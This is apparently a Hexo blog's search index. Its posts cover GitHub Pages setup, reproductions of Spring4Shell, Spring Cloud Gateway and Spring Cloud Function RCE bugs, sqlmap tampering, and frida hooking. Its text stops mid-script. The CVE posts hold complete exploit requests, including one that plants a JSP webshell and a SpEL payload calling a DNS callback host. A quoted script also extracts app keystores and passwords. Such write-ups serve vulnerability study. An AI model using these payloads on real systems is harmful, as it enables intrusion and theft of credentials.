<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo&amp;Gitpage搭建记录</title>
    <url>/2022/03/18/Hexo&amp;Gitpage%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li><p>Git v2.33.0</p>
</li>
<li><p>Windows10 21H2</p>
</li>
<li><p>Node v16.14.1</p>
</li>
<li><p>SSH</p>
</li>
</ul>
<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><h3 id="配置ssh密钥"><a href="#配置ssh密钥" class="headerlink" title="配置ssh密钥"></a>配置ssh密钥</h3><ul>
<li>全局配置本地git账户</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#对应github邮箱和用户名</span><br><span class="line">git config --global user.name &quot;用户名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱地址&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>生成ssh key</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#默认生成路径在C:\Users\用户名\.ssh目录下</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱地址&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>查看公钥内容，先在github添加生成的公钥</li>
</ul>
<p><img src="https://s2.loli.net/2022/03/17/hCuK1eJrQzsPS3l.png" alt="image.png"></p>
<ul>
<li>然后添加到本地信任列表，顺序不能反，否则会提示权限错误</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com </span><br></pre></td></tr></table></figure>

<ul>
<li>出现 <strong>Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access</strong> 即为配置成功</li>
</ul>
<h3 id="新建github仓库"><a href="#新建github仓库" class="headerlink" title="新建github仓库"></a>新建github仓库</h3><ul>
<li>新建名为<strong>用户名.github.io</strong>的仓库，如下，该页面会自动认为是gitpage仓库，过几分钟后访问用户名.github.io即可访问页面内容</li>
</ul>
<p><img src="https://s2.loli.net/2022/03/17/TmKIPGQkp4jZxBi.png" alt="image.png"></p>
<h3 id="下载和部署hexo"><a href="#下载和部署hexo" class="headerlink" title="下载和部署hexo"></a>下载和部署hexo</h3><ul>
<li>下载cnpm，国内速度较快</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<ul>
<li>初始化hexo</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm install -g hexo-cli#下载hexo</span><br><span class="line">hexo init Blog			#初始化hexo 新建Blog文件夹</span><br><span class="line">cd Blog</span><br><span class="line">cnpm install			#进入文件夹安装依赖</span><br></pre></td></tr></table></figure>

<ul>
<li><p>配置Next主题，<a href="https://github.com/theme-next/hexo-theme-next">下载主题</a>，解压到Blog的themes文件夹，在解压好的Next文件夹使用cnpm install安装依赖</p>
</li>
<li><p>在Blog目录下_config.yml中的theme修改为next</p>
</li>
</ul>
<p><img src="https://s2.loli.net/2022/03/17/KGn3ZldABYkcJEX.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean					#清除缓存，尤其是在更换主题后</span><br><span class="line">hexo g						#生成静态文件</span><br><span class="line">hexo d						#部署网站</span><br></pre></td></tr></table></figure>



<ul>
<li>在Blog文件夹启动hexo服务，访问本地4000端口即可访问，这是已经配置好Next主题的页面</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/03/17/ZGl43FAfRmMj8og.png" alt="image.png"></p>
<h3 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到github</h3><ul>
<li>修改Blog下配置文件，格式如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:</span><br><span class="line">    github: git@github.com:msfisgood/msfisgood.github.io.git,master</span><br></pre></td></tr></table></figure>

<ul>
<li>安装部署插件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm install hexo-deployer-git --save</span><br><span class="line">hexo g -d 								#部署上传</span><br></pre></td></tr></table></figure>

<ul>
<li>修改git仓库分支，运行完上一步还需要修改分支，hexo的配置为master分支，仓库默认为main分支，需要在仓库设置-&gt;页面中修改分支为master</li>
</ul>
<p><img src="https://s2.loli.net/2022/03/17/TvpdI6wfGuFSAnl.png" alt="image.png"></p>
<ul>
<li>过几分钟，访问<a href="https://msfisgood.github.io/%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E9%A1%B5%E9%9D%A2%E4%BA%86">https://msfisgood.github.io/就可以看到页面了</a></li>
</ul>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul>
<li>后续会继续整理一些hexo技巧和美化方面的内容</li>
</ul>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>Hexo&amp;Next</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring4Shell-CVE-2022-22965</title>
    <url>/2022/04/01/Spring4Shell-CVE-2022-22965/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>2022年3月30日，CNVD平台接收到蚂蚁科技集团股份有限公司报送的Spring框架远程命令执行漏洞。由于Spring框架存在处理流程缺陷，攻击者可在远程条件下，实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。使用Spring框架或衍生框架构建网站等应用，且同时使用JDK版本在9及以上版本的，易受此漏洞攻击影响。</p>
<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><ul>
<li>JDK9或以上版本系列</li>
<li>Spring框架或衍生的SpringBoot等框架，版本小于v5.3.18或v5.2.20</li>
<li>Spring JavaBean表单参数绑定需要满足一定条件</li>
<li>部署在Tomcat容器中，且日志记录功能开启</li>
</ul>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>日志写马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">suffix: %&gt;//</span><br><span class="line">c1: Runtime</span><br><span class="line">c2: &lt;%</span><br><span class="line">DNT: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/04/01/1GxKLvHUhbw2Y5q.png" alt="image-20220401125212182"></p>
<p>访问webshell</p>
<p><img src="https://s2.loli.net/2022/04/01/5GWQNfvFjn9diVT.png" alt="image-20220401125417619"></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行-CVE-2022-22947</title>
    <url>/2022/03/30/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
<p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Cloud Gateway &lt; 3.1.0</p>
<p>Spring Cloud Gateway &lt; 3.0.7</p>
<p>Spring Cloud Gateway 其他已不再更新版本</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ol>
<li>添加包含恶意SpEL表达式的路由：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;hacktest&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>刷新路由</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>访问创建的路由</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: application/x-www-form-urlencoded</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/04/03/UEJWBiGQaDtMbeT.png" alt="image-20220330205133211"></p>
<ol start="4">
<li>删除创建的路由</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>再次刷新</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md</a></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>Spring Cloud Gateway</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap tamper</title>
    <url>/2022/03/28/sqlmap_tamper/</url>
    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li>tamper<ul>
<li>sqlmap中的模块，用于自定义编码payload绕过防护设备</li>
<li>本文使用tamper并不是为了绕过防护设备，而是服务端只接收编码后的数据，对于未编码的数据不会接收</li>
</ul>
</li>
<li>查找加密算法，姿势很多，能找到就行，本次环境为rc4+base64+url编码</li>
<li>js2py库，用于使用python调用js</li>
</ul>
<h2 id="编写tamper"><a href="#编写tamper" class="headerlink" title="编写tamper"></a>编写tamper</h2><ol>
<li>需要调用外部js，即获取到的js加密代码</li>
</ol>
<p><img src="https://s2.loli.net/2022/03/31/r8EdeJgCZKm7fSG.png"></p>
<ol start="2">
<li><p>js2py库，用于调用js</p>
<p>​    这里遇到了一些问题，开始使用的方法是<code>eval_js()</code>，但是该方法只能调用单函数js文件，遇到多函数的js文件会调用最后一个函数</p>
<p>​    <code>EvalJs()</code>，可以执行多函数js代码，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with open(&#x27;./get_key.js&#x27;) as fp:</span><br><span class="line">20     js = fp.read()</span><br><span class="line">21     # ctx2 = execjs.compile(js)</span><br><span class="line">22     context = js2py.EvalJs()</span><br><span class="line">23     context.execute(js)</span><br><span class="line">24     vl5x=context.getKey(cookie)		//getKey是get_key.js中的方法，如果要调用其他方法，例如context.main即调用main方法</span><br></pre></td></tr></table></figure>
</li>
<li><p>payload处理</p>
</li>
</ol>
<p>​            存在注入的参数要求必须有一个正确的可查到的的参数值，但是这个值也需要编码，放在数据包里面是肯定的不行的，因为包里面的数据不会通过tamper进行处理，所以只能通过tamper把payload进行处理，直接赋值个payload一个固定的值，并且一同调用js进行加密</p>
<p><img src="https://s2.loli.net/2022/03/31/1mkMIbg3NzKjWqV.png"></p>
<ol start="4">
<li>到这里思路基本理清楚了，原参数–&gt;调用tamper–&gt;payload加密–&gt;sqlmap测试，具体代码如下：</li>
</ol>
<p><img src="https://s2.loli.net/2022/03/31/zkaPcuvxi41nhw2.png"></p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><code>sqlmap -r .\11.txt -p &quot;xxx&quot; --tamper=test.py --dbms=mssql --force-ssl --proxy=http://127.0.0.1:8080</code></p>
<p><img src="https://s2.loli.net/2022/03/31/HhA1W5ZO7BxiDeM.png"></p>
]]></content>
      <categories>
        <category>渗透技巧</category>
      </categories>
      <tags>
        <tag>Sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring-Cloud-Function-SpEL-RCE</title>
    <url>/2022/03/30/Spring-Cloud-Function-SpEL-RCE/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">host:127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/04/03/ZkqtToNXg9W8BLD.png" alt="image-20220403232403602"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">host:127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression:T(java.net.InetAddress).getByName(&quot;81731h.dnslog.cn&quot;)</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/04/03/m6fvrOawhydJ7tC.png" alt="image-20220403232423476"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/hktalent/spring-spel-0day-poc">https://github.com/hktalent/spring-spel-0day-poc</a></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>Spring Cloud Function</tag>
      </tags>
  </entry>
  <entry>
    <title>frida hook初探</title>
    <url>/2022/04/22/frida%20hook/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这段时间趁着项目较少，把APP编写和frida简单hook进行了一些学习，不过毕竟java底子比较薄弱，学习过程还是遇到了一些问题，在此进行一些记录</p>
<h1 id="提前填坑"><a href="#提前填坑" class="headerlink" title="提前填坑"></a>提前填坑</h1><ul>
<li><p>安卓启动frida前执行<code>setenforce 0</code>关闭SELinux，否则服务端可能起不来</p>
</li>
<li><p><strong>frida脚本运行前要关闭Xposed hook模块</strong>，否则会提示非法指令</p>
</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/22/d6jMp9KWqc2CI4k.png" alt="image-20220421154707945"></p>
<ul>
<li>如果刷了面具的话需要关闭MagiskHide，否则也会报错</li>
<li>使用adb进行端口转发，frida默认端口27042，否则会报找不到APP <a href="https://blog.csdn.net/u013553529/article/details/80036227">adb forward</a></li>
</ul>
<p><img src="https://s2.loli.net/2022/04/21/RJnjpFSr3hfqeGa.png" alt="image-20220421164237480"></p>
<p><img src="https://s2.loli.net/2022/04/22/ivOfgEteUPwy8TY.png" alt="image-20220421165827905"></p>
<p>类似调试Web前端JS，frida调试APP代码是通过重载目标功能函数实现的，即调试APP中的函数，并对其进行传参调用和修改返回值等</p>
<p><img src="https://s2.loli.net/2022/04/22/VAvxZ19oBKW7OUf.png" alt="image-20220421114357976"></p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>下面用一个demo来解释下frida的hook，参考文章：<a href="https://www.cnblogs.com/luoyesiqiu/p/10718997.html">https://www.cnblogs.com/luoyesiqiu/p/10718997.html</a></p>
<ol>
<li>编写用于hook的简单APP，程序计算输入的分数，如果分数之和大于180则返回true，否则返回false</li>
</ol>
<p><img src="https://s2.loli.net/2022/04/22/c51rFyvajZwUJPI.png" alt="image-20220422144946794"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#主函数</span><br><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>  String TAG=<span class="string">&quot;Crackme&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> TextView textView;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        textView =findViewById(R.id.id);</span><br><span class="line"></span><br><span class="line">        textView.append(<span class="string">&quot;是否及格：&quot;</span>+isExcellent(<span class="number">46</span>,<span class="number">54</span>)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="type">boolean</span> <span class="title function_">isExcellent</span><span class="params">(<span class="type">int</span> chinese, <span class="type">int</span> math)</span>&#123;</span><br><span class="line">        textView.append(<span class="string">&quot;语文+数学总分：&quot;</span>+(chinese+math)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>( chinese + math &gt;=<span class="number">180</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#activity_main.xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:layout_height=&quot;match_parent&quot;</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:gravity=&quot;center&quot;</span><br><span class="line">    android:orientation=&quot;vertical&quot;</span><br><span class="line">    tools:context=&quot;.MainActivity&quot; &gt;</span><br><span class="line"></span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:id=&quot;@+id/id&quot;</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;/&gt;</span><br><span class="line">&lt;/LinearLayout&gt;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>hook isExcellent()函数，让函数返回true，即传入参数之和要大于180</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(function() &#123;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        var test = Java.use(&#x27;com.example.myapplication.MainActivity&#x27;);							//加载类	</span><br><span class="line">        test.isExcellent.overload(&quot;int&quot;,&quot;int&quot;).implementation = function(chinese,math) &#123;		//使用overload重载方法，返回值传入参数</span><br><span class="line">            return this.isExcellent(100,100);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,0);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>实现效果</li>
</ol>
<p><img src="https://s2.loli.net/2022/04/22/PqGt9KhZMEiVNLd.png" alt="image-20220422112403888"></p>
<p><img src="https://s2.loli.net/2022/04/22/oZWQPgS5J3qwVxG.png" alt="image-20220422112439752"></p>
<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><h2 id="Frida-hook-获取双向认证证书和密码"><a href="#Frida-hook-获取双向认证证书和密码" class="headerlink" title="Frida hook 获取双向认证证书和密码"></a>Frida hook 获取双向认证证书和密码</h2><p>如果开发者<strong>使用了java.security.KeyStore</strong>来进行双向认证校验，那么通过hook该函数的load方法可获取证书文件和证书密码 </p>
<p>脚本链接：<a href="https://gist.github.com/ceres-c/cb3b69e53713d5ad9cf6aac9b8e895d2">https://gist.github.com/ceres-c/cb3b69e53713d5ad9cf6aac9b8e895d2</a> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">author: ceres-c</span></span><br><span class="line"><span class="string">usage: ./frida-extract-keystore.py</span></span><br><span class="line"><span class="string">       Once the keystore(s) have been exported you have to convert them to PKCS12 using keytool</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> frida, sys, time</span><br><span class="line"></span><br><span class="line">app_name = <span class="string">&#x27;com.example.httpstest&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">ext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">global</span> i, ext</span><br><span class="line">    <span class="keyword">if</span> (message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;event&#x27;</span> <span class="keyword">in</span> message[<span class="string">&#x27;payload&#x27;</span>]):</span><br><span class="line">        <span class="keyword">if</span> (message[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;event&#x27;</span>] == <span class="string">&#x27;+found&#x27;</span>):</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[+] Hooked keystore&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> (message[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;event&#x27;</span>] == <span class="string">&#x27;+type&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;  [+] Cert Type: &quot;</span> + <span class="string">&#x27;&#x27;</span>.join(message[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;certType&#x27;</span>]))</span><br><span class="line">            <span class="keyword">if</span> (message[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;certType&#x27;</span>] == <span class="string">&#x27;PKCS12&#x27;</span>):</span><br><span class="line">                ext = <span class="string">&#x27;.jks&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> (message[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;event&#x27;</span>] == <span class="string">&#x27;+pass&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;  [+] Password: &quot;</span> + <span class="string">&#x27;&#x27;</span>.join(message[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> (message[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;event&#x27;</span>] == <span class="string">&#x27;+write&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;  [+] Writing to file: keystore&quot;</span> + <span class="built_in">str</span>(i) + ext)</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&#x27;keystore&#x27;</span> + <span class="built_in">str</span>(i) + ext, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            f.write(<span class="built_in">bytes</span>.fromhex(message[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;cert&#x27;</span>]))</span><br><span class="line">            f.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">setTimeout(function() &#123;</span></span><br><span class="line"><span class="string">    Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">        var keyStoreLoadStream = 